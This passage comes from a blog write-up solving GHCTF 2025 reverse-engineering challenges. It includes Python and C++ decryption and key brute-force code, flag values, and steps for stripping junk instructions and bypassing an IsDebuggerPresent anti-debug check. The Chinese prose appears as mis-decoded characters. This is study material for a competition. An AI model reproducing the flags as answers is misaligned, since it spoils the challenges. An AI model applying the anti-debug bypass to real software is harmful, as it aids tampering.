function_">rc4_decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    key = key.encode()</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    plaintext = []</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> ciphertext:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        k = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        plaintext.append(((byte - <span class="number">0x39</span>) ^ k) % <span class="number">256</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">replay</span>(<span class="params">violin, bass, mode</span>):</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="number">1</span>:</span><br><span class="line">        res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(violin):</span><br><span class="line">            offset = <span class="built_in">ord</span>(bass[i % <span class="built_in">len</span>(bass)])</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">                res += <span class="built_in">chr</span>((<span class="built_in">ord</span>(violin[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) - offset) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&#x27;A&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">                res += <span class="built_in">chr</span>((<span class="built_in">ord</span>(violin[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - offset) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&#x27;0&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">                res += <span class="built_in">chr</span>((<span class="built_in">ord</span>(violin[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) - offset) % <span class="number">10</span> + <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res += violin[i]</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="number">3</span>:</span><br><span class="line">            Ek = <span class="built_in">ord</span>(bass[<span class="number">0</span>]) % <span class="number">10</span> + <span class="number">2</span></span><br><span class="line">            Dk = <span class="built_in">int</span>(<span class="built_in">len</span>(violin) / Ek)</span><br><span class="line">            res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            yushu = <span class="built_in">len</span>(violin) % Ek</span><br><span class="line">            steps = []</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(violin) % Ek == <span class="number">0</span>:</span><br><span class="line">                step = Dk</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Ek):</span><br><span class="line">                    steps.append(step)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                big_step = math.ceil(<span class="built_in">len</span>(violin) / Ek)</span><br><span class="line">                small_step = <span class="built_in">int</span>(<span class="built_in">len</span>(violin) / Ek)</span><br><span class="line">                <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(yushu):</span><br><span class="line">                    steps.append(big_step)</span><br><span class="line">                <span class="keyword">for</span> q <span class="keyword">in</span> <span class="built_in">range</span>(Ek - yushu):</span><br><span class="line">                    steps.append(small_step)</span><br><span class="line"></span><br><span class="line">            n_column = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> n_column &lt; math.ceil(<span class="built_in">len</span>(violin) / Ek):</span><br><span class="line">                count_steps = <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> one_step <span class="keyword">in</span> steps:</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(res) == <span class="built_in">len</span>(violin):</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        res += violin[n_column + count_steps]</span><br><span class="line">                        count_steps += one_step</span><br><span class="line">                n_column += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="number">4</span>:</span><br><span class="line">        step = <span class="built_in">ord</span>(bass[<span class="number">0</span>]) % <span class="number">10</span> + <span class="number">2</span></span><br><span class="line">        res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        res += violin[step:]</span><br><span class="line">        res += violin[:step]</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="number">5</span>:</span><br><span class="line">        violin_decode = base64.b64decode(violin.translate(<span class="built_in">str</span>.maketrans(new_table, old_table)))</span><br><span class="line">        res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(violin_decode):</span><br><span class="line">            res += <span class="built_in">chr</span>(char ^ <span class="built_in">ord</span>(bass[i % <span class="built_in">len</span>(bass)]) + <span class="number">0x39</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="number">6</span>:</span><br><span class="line">        violin_byte = base64.b64decode(violin.translate(<span class="built_in">str</span>.maketrans(new_table, old_table)))</span><br><span class="line">        res = rc4_decrypt(violin_byte, bass)</span><br><span class="line">        <span class="keyword">return</span> res.decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    violin = [<span class="string">&quot;WgvDmssEvcY326bHo3nNro3vXvvfmgrz&quot;</span>, <span class="string">&quot;gX+Ri9PG=bt5=00B6hscPQOL&quot;</span>, <span class="string">&quot;T6bHgUPL2gXUd=xT=FNHtPzV&quot;</span>]</span><br><span class="line">    v = [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">    chord = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v)):</span><br><span class="line">        tmp = replay(violin[v[i] - <span class="number">1</span>], violin[v[i] % <span class="number">3</span>], chord[i])</span><br><span class="line">        violin[v[i] - <span class="number">1</span>] = tmp</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(violin))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="Flagå€¼-6"><a href="#Flagå€¼-6" class="headerlink" title="Flagå€¼"></a>Flagå€¼</h3><p><code>NSSCTF&#123;P4ch3Lbel&#39;s_C@n0n_1n_D_mAjOr&#125;</code></p><h2 id="è…èš€"><a href="#è…èš€" class="headerlink" title="è…èš€"></a>è…èš€</h2><h3 id="åˆ†æ-7"><a href="#åˆ†æ-7" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>IDAåˆ†æmainå‡½æ•°ï¼Œå‘ç°å¼€å¤´ç¨‹åºè¦è¯»å…¥ä¸€ä¸ªInput.pngæ–‡ä»¶ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/56.png" alt="alt text"></p><p>å¹¶ä¸”åœ¨ç¨‹åºå°¾éƒ¨å°†åŠ å¯†åçš„æ•°æ®å†™åˆ°encæ–‡ä»¶ï¼Œè¾“å‡ºå®Œæˆè¯­å¥ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/57.png" alt="alt text"></p><p>è¿›å…¥è¿™ä¸ªå‡½æ•°ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/58.png" alt="alt text"></p><p>å‘ç°è¿™ä¸ªå‡½æ•°æ˜¯ä¸€ä¸ªRC4åŠ å¯†æµç¨‹ï¼Œé€šè¿‡0x100ç‰¹å¾å’Œä¸€äº›å¼‚æˆ–è®¡ç®—å¯ä»¥çœ‹å‡ºæ¥çš„ã€‚</p><p>å¹¶ä¸”æ˜¯å˜ç§RC4ï¼Œæœ€åå¼‚æˆ–åŠ å¯†çš„æ—¶å€™å¤šå¼‚æˆ–ä¸Šäº†0x1fã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/59.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/60.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/61.png" alt="alt text"></p><p>æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªInput.pngæ–‡ä»¶ï¼ŒåŠ¨è°ƒç¨‹åºè¿è¡Œåˆ°è¿™ä¸ªå‡½æ•°æ–­ä½ï¼Œa2å¯ä»¥åœ¨ç¬¬äºŒä¸ªwhileå¾ªç¯ä¸­çœ‹å‡ºæ¥ï¼Œæ˜¯å……å½“RC4å¯†é’¥ã€‚</p><p>è·³åˆ°a2åœ°å€ï¼Œå‘ç°æ˜¯ä¸€ä¸ªè¿™æ ·çš„ç»“æ„ï¼Œæ•°æ®é•¿åº¦+æ•°æ®æŒ‡é’ˆï¼Œæ•°æ®æŒ‡é’ˆè·³è¿‡å»ï¼Œè¿™åå…­ä¸ªå­—èŠ‚å°±æ˜¯å¯†é’¥ï¼Œå‘ç°ä¸€äº›ç‰¹å¾ï¼Œçœ‹èµ·æ¥åƒæ˜¯PNGæ–‡ä»¶çš„å¼€å¤´éƒ¨åˆ†å­—èŠ‚å’Œç»“å°¾éƒ¨åˆ†å­—èŠ‚ä¹±åºæ··åœ¨ä¸€èµ·ï¼Œä¸è¿‡ä¸é‡è¦ï¼Œåªè¦åŠ¨è°ƒæ‹¿åˆ°16å­—èŠ‚çš„keyå³å¯ã€‚<br>å¯†é’¥ï¼š<code>60 82 AE 42 4E 44 49 45 1A 0A 0D 0A 4E 47 89 50</code></p><p><img src="/2025/03/06/GHCTF2025WP/62.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/63.png" alt="alt text"></p><p>è€Œa3æ˜¯å³å°†è¢«åŠ å¯†çš„æ˜æ–‡æ•°æ®ï¼Œè·³è¿‡å»å‘ç°ä¹Ÿæ˜¯åŒæ ·ç»“æ„ï¼Œå‘ç°å¤§å°æ˜¯0x30Bï¼Œå’Œæˆ‘ç»™çš„Input.pngæ–‡ä»¶å­—èŠ‚æ•°ä¸€æ ·ï¼Œè·³è¿‡å»å°±ä¼šå‘ç°å°±æ˜¯è¯»å…¥çš„pngæ–‡ä»¶å­—èŠ‚ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/64.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/65.png" alt="alt text"></p><p>ä»å‡½æ•°å°¾éƒ¨çš„èµ‹å€¼å¯ä»¥çœ‹å‡ºa1å°±æ˜¯åŠ å¯†åæ•°æ®å‚¨å­˜çš„åœ°æ–¹ï¼Œå°†è¯¥å‡½æ•°æ‰§è¡Œå®Œè¿”å›åˆ°mainå‡½æ•°ï¼Œç„¶åè·³åˆ°a1åœ°å€å°†æ•°æ®å¤åˆ¶å‡ºæ¥å°è¯•RC4+Xorè§£å¯†ï¼Œå‘ç°ç¡®å®å¯ä»¥è§£å¯†å‡ºåŸå­—èŠ‚ï¼Œ</p><p><img src="/2025/03/06/GHCTF2025WP/66.png" alt="alt text"></p><p>ç›´æ¥æ‰§è¡Œåˆ°write_allå³å°†å†™å‡ºåˆ°encæ–‡ä»¶å¤„ï¼Œç„¶åæŸ¥çœ‹v18ï¼Œv18æ˜¯é€šè¿‡ä¸Šé¢RC4åŠ å¯†è¿”å›çš„v44å¾—åˆ°çš„ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/67.png" alt="alt text"></p><p>å‘ç°å¯¹æ¯”åŸRC4åŠ å¯†è¿”å›çš„æ•°æ®ï¼Œå†™å‡ºçš„æ•°æ®åšäº†å­—èŠ‚é¡ºåºç¿»è½¬å¤„ç†ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/68.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/69.png" alt="alt text"></p><p>ç›´æ¥è®©ç¨‹åºè·‘èµ·æ¥ï¼Œå†™å‡ºencæ–‡ä»¶ï¼Œæ‹–å…¥åˆ°010Editorä¸­ï¼Œå‘ç°ç¡®å®æ˜¯å°†RC4åŠ å¯†åçš„æ•°æ®ç¿»è½¬åå†å†™åˆ°çš„æ–‡ä»¶ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/70.png" alt="alt text"></p><p>æ‰€ä»¥è§£å¯†æµç¨‹ä¸ºï¼šè¯»å…¥é¢˜ç›®encé™„ä»¶-&gt;ç¿»è½¬å­—èŠ‚-&gt;RC4è§£å¯†</p><p>Cyberchefï¼š</p><p><img src="/2025/03/06/GHCTF2025WP/71.png" alt="alt text"></p><p>å¯¼å‡ºå›¾ç‰‡å¾—åˆ°Flag</p><p><img src="/2025/03/06/GHCTF2025WP/72.png" alt="alt text"></p><h3 id="Flagå€¼-7"><a href="#Flagå€¼-7" class="headerlink" title="Flagå€¼"></a>Flagå€¼</h3><p><code>NSSCTF&#123;Y0u_ar3_ru5t_m@st3r&#125;</code></p><h2 id="ezObfus"><a href="#ezObfus" class="headerlink" title="ezObfus"></a>ezObfus</h2><h3 id="åˆ†æ-8"><a href="#åˆ†æ-8" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>IDAåˆ†æç¨‹åºï¼Œå‘ç°å­˜åœ¨èŠ±æŒ‡ä»¤ï¼Œå¤§éƒ¨åˆ†èŠ±æŒ‡ä»¤å°±ä»¥ä¸‹å‡ ç§æƒ…å†µï¼Œç¬¬ä¸€ç§æˆªå›¾åŒºåŸŸæ‰€æœ‰å­—èŠ‚éƒ½nopï¼Œåé¢å‡ ç§å°±è·³è½¬åœ°å€æ±‡ç¼–æŒ‰uè¿›è¡Œundefineï¼Œç„¶åå†è·³è¿‡å¯¹åº”å­—èŠ‚æŒ‰cè¿˜åŸæ±‡ç¼–ä»£ç ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/73.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/74.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/75.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/76.png" alt="alt text"></p><p>å»æ‰mainå‡½æ•°å‡ ä¸ªèŠ±æŒ‡ä»¤åæŒ‰pè¿˜åŸå‡½æ•°è¿›è¡Œåç¼–è¯‘ï¼Œå‘ç°å­˜åœ¨ä»£ç æ··æ·†ï¼Œä¸”å¼€å¤´æœ‰åè°ƒè¯•ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/77.png" alt="alt text"></p><p>ç›´æ¥æ¡ä»¶æ–­ç‚¹åœ¨IsDebuggerPresentï¼Œå°†è¿”å›å€¼eaxè®¾ç½®ä¸º0å³å¯è·³è¿‡åè°ƒè¯•ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/78.png" alt="alt text"></p><p>å‘ç°ä»£ç ä¸­æœ‰ç”¨åˆ°ä¸€äº›å¸¸æ•°ï¼Œè·³è½¬è¿‡æ¥å‘ç°æ˜¯0-9ï¼Œæ‰‹åŠ¨å°†åå­—éƒ½å‘½åä¸ºå¯¹åº”æ•°å­—ï¼Œæ–¹ä¾¿åˆ†æä»£ç ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/79.png" alt="alt text"></p><p>ä¸Šå›¾å‘ç°forå¾ªç¯æœ€åiæ˜¯+&#x3D;äº†ä¸€ä¸ªå‡½æ•°ä¼ è¿›å»1çš„è¿”å›å€¼ï¼Œå»æ‰è¯¥å‡½æ•°èŠ±æŒ‡ä»¤åï¼Œå¯ä»¥å‘ç°æ˜¯ä»¥ä¸‹ä»£ç ï¼Œè¿”å›çš„æ°¸è¿œæ˜¯ä¼ å‚çš„å€¼ï¼Œä¹Ÿå°±æ˜¯1ï¼Œæ‰€ä»¥å…¶å®è¿™ä¸ªå‡½æ•°æ²¡ä»€ä¹ˆç”¨ï¼Œç›´æ¥çœ‹å‚æ•°å€¼å°±æ˜¯å¯¹åº”å€¼ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/80.png" alt="alt text"></p><p>ç„¶åé…åˆåŠ¨è°ƒï¼Œçœç•¥å»æ··æ·†éƒ¨åˆ†ä»£ç ï¼ŒæŠ½ç¦»å‡ºä¸»è¦æ ¸å¿ƒä»£ç ï¼Œä¸”æ‰€æœ‰å¸¸é‡å­—ç¬¦ä¸²éƒ½è¢«åŠ å¯†è¿‡çš„ï¼Œåªèƒ½åŠ¨è°ƒè·å–ã€‚</p><p>ç¬¬ä¸€éƒ¨åˆ†keyæ ¡éªŒä»£ç å¦‚ä¸‹ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/81.png" alt="alt text"></p><p>åŒç†ç¬¬äºŒéƒ¨åˆ†çš„Flagæ ¡éªŒå¦‚ä¸‹ï¼Œbyte_F1A004å°±æ˜¯è¢«åŠ å¯†çš„Flagã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/82.png" alt="alt text"></p><p>å»æ‰åŠ å¯†å‡½æ•°çš„èŠ±æŒ‡ä»¤ï¼Œç„¶ååŒæ ·è¿›è¡ŒåŠ¨è°ƒæŠ½ç¦»å…³é”®ä»£ç ã€‚</p><p><img src="/2025/03/06/GHCTF2025WP/83.png" alt="alt text"></p><p>è¿˜åŸå‡ºç¨‹åºå®Œæ•´åŸå§‹ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *Input, <span class="type">uint32_t</span> Key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> InputLen = <span class="built_in">strlen</span>((<span class="type">char</span> *)Input);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; InputLen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint8_t</span> v26 = i ^ (Key &gt;&gt; ((<span class="number">3</span> - i % <span class="number">4</span>) * <span class="number">8</span>));</span><br><span class="line">        <span class="type">uint8_t</span> v27 = v26 ^ Input[i];</span><br><span class="line">        <span class="type">uint8_t</span> v28 = (v27 &gt;&gt; <span class="number">5</span>) | (v27 * <span class="number">8</span>);</span><br><span class="line">        v28 += i;</span><br><span class="line">        Input[i] = v28;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> Key = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> Input[<span class="number">256</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> v66 = <span class="number">0x811C9DC5</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint8_t</span> v71 = Key &gt;&gt; (i * <span class="number">8</span>);</span><br><span class="line">        <span class="type">uint32_t</span> v67&#123;&#125;;</span><br><span class="line">        <span class="keyword">if</span> (v71 % <span class="number">2</span>)</span><br><span class="line">            v67 = v66 ^ v71;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            v67 = <span class="number">16777619</span> * v66;</span><br><span class="line">        v67 = (v67 &gt;&gt; <span class="number">25</span>) | (v67) &lt;&lt; <span class="number">7</span>;</span><br><span class="line">        v66 = v67 - v71;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (v66 != <span class="number">1172912374</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(Input); j++)</span><br><span class="line">    &#123;</span><br><span class="line">        Input[j] ^= <span class="number">8</span> * (v66 &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Encrypt</span>(Input, Key);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡çˆ†ç ´å¾—åˆ°ç›®æ ‡Key</p><p>çˆ†ç ´ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> Key = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; Key &lt; <span class="number">0xffffffff</span>; Key++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v66 = <span class="number">0x811C9DC5</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">uint8_t</span> v71 = Key &gt;&gt; (i * <span class="number">8</span>);</span><br><span class="line">            <span class="type">uint32_t</span> v67&#123;&#125;;</span><br><span class="line">            <span class="keyword">if</span> (v71 % <span class="number">2</span>)</span><br><span class="line">                v67 = v66 ^ v71;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                v67 = <span class="number">16777619</span> * v66;</span><br><span class="line">            v67 = (v67 &gt;&gt; <span class="number">25</span>) | (v67) &lt;&lt; <span class="number">7</span>;</span><br><span class="line">            v66 = v67 - v71;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (v66 == <span class="number">1172912374</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%X\n&quot;</span>, Key);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çˆ†ç ´å¾—åˆ°Keyï¼š<code>8C90F77B</code></p><p>ç„¶åé€šè¿‡åŠ å¯†å‡½æ•°ç¼–å†™è§£å¯†å‡½æ•°è§£å¯†byte_F1A004æ•°ç»„å³å¯å¾—åˆ°Flagã€‚</p><p>è§£å¯†ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> EncFlag[]&#123;</span><br><span class="line">    <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x79</span>, <span class="number">0x9E</span>, <span class="number">0xA8</span>,</span><br><span class="line">    <span class="number">0xE1</span>, <span class="number">0x1C</span>, <span class="number">0xDA</span>, <span class="number">0x04</span>, <span class="number">0x1D</span>,</span><br><span class="line">    <span class="number">0xC1</span>, <span class="number">0x6E</span>, <span class="number">0x80</span>, <span class="number">0x82</span>, <span class="number">0x0D</span>,</span><br><span class="line">    <span class="number">0x8A</span>, <span class="number">0x4C</span>, <span class="number">0x65</span>, <span class="number">0xE1</span>, <span class="number">0x46</span>,</span><br><span class="line">    <span class="number">0x71</span>, <span class="number">0x31</span>, <span class="number">0xED</span>, <span class="number">0xD2</span>, <span class="number">0x14</span>,</span><br><span class="line">    <span class="number">0xC5</span>, <span class="number">0x39</span>, <span class="number">0xB5</span>, <span class="number">0x49</span>, <span class="number">0xE2</span>,</span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0xA9</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *Input, <span class="type">uint32_t</span> Key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint8_t</span> v26 = Key &gt;&gt; <span class="number">8</span> * (<span class="number">3</span> - i % <span class="number">4</span>);</span><br><span class="line">        v26 ^= (<span class="type">uint8_t</span>)(i &amp; <span class="number">0xff</span>);</span><br><span class="line"></span><br><span class="line">        Input[i] = (Input[i] - (<span class="type">uint8_t</span>)i) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        